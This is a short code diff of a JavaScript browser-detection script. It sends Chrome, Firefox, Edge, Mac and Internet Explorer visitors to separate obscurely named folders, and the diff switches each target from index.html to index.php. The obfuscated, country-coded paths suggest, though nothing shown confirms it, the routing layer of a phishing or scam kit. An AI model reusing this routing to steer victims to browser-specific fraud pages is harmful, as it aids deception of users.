@@ -8,25 +8,25 @@ isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
 
 if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
 	// is Google chrome
-window.location.href = "FRJdfdfdDEf0FRfd0CH1010FR80088Wi/index.html";
+window.location.href = "FRJdfdfdDEf0FRfd0CH1010FR80088Wi/index.php";
 }
 if(navigator.userAgent.indexOf("Firefox") != -1 )
 	{
-			 window.location.href = " FRJdfdfdDEf0FRfd0FF1010FR80088Wi/index.html";
+			 window.location.href = " FRJdfdfdDEf0FRfd0FF1010FR80088Wi/index.php";
 	}
 
 	if(window.navigator.userAgent.indexOf("dg") != -1 )
 		{
-				 window.location.href = "FRJdfdfdDEf0FRfd0ECH1010FR80088Wi/index.html";
+				 window.location.href = "FRJdfdfdDEf0FRfd0ECH1010FR80088Wi/index.php";
 		}
 
 if(window.navigator.userAgent.indexOf("Edge") != -1 )
 	{
-			 window.location.href = "FRJdfdfdDEf0FRfd0ED1010FR80088Wi/index.html";
+			 window.location.href = "FRJdfdfdDEf0FRfd0ED1010FR80088Wi/index.php";
 	}
 if(window.navigator.userAgent.indexOf("Mac") != -1 )
 	{
-			 window.location.href = "FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html";
+			 window.location.href = "FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.php";
 	}
 if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
 	{
